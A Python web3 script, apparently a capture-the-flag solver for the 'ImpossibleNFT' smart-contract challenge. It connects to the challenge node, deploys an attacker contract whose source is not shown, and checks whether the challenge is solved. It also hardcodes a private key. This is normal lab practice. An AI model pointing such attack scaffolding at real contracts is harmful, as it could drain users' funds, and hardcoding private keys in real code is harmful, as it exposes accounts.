from eth_account import Account
from web3 import Web3
from web3.middleware import construct_sign_and_send_raw_middleware
from solcx import compile_files, install_solc

install_solc(version='0.8.0')

# generate ABI from sources
compiled = compile_files([ 'Setup.sol' ], output_values=['abi','bin'], solc_version='0.8.0')
setup_abi = compiled['Setup.sol:Setup']['abi']
challenge_abi = compiled['ImpossibleNFT.sol:ImpossibleNFT']['abi']
mycontract_abi = compiled['ImpossibleNFT.sol:MyContract']['abi']

bytes = compiled['ImpossibleNFT.sol:MyContract']['bin']

# connect to Web3
w3 = Web3(Web3.HTTPProvider('http://ctf.mevsec.com:50310'))
print(w3.is_connected())

setup_contract_addr = '0x876807312079af775c49c916856A2D65f904e612'
privateKey = '0xedbc6d1a8360d0c02d4063cdd0a23b55c469c90d3cfbc2c88a015f9dd92d22b3'
publicKey = '0x133756e1688E475c401d1569565e8E16E65B1337'

# unlock account
account = Account.from_key(privateKey)
w3.eth.default_account = account.address
w3.middleware_onion.add(construct_sign_and_send_raw_middleware(account))

w3.eth.set_gas_price_strategy(lambda w3, params: Web3.to_wei(1, 'gwei'))

# get contract from address
setup_contract = w3.eth.contract(setup_contract_addr, abi=setup_abi)
challenge_addr = setup_contract.functions.nft().call()
challenge = w3.eth.contract(challenge_addr, abi=challenge_abi)
mycontract_t = w3.eth.contract(abi=mycontract_abi, bytecode=bytes)

construct_txn = mycontract_t.constructor().build_transaction(
    {
        'from': publicKey,
        'nonce': w3.eth.get_transaction_count(publicKey),
    }
)
tx = w3.eth.account.sign_transaction(construct_txn, privateKey)
tx_hash = w3.eth.send_raw_transaction(tx.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

mycontract = w3.eth.contract(tx_receipt.contractAddress, abi=mycontract_abi)

# payload
print(setup_contract.functions.isSolved().call())

import code
code.interact(local=locals())
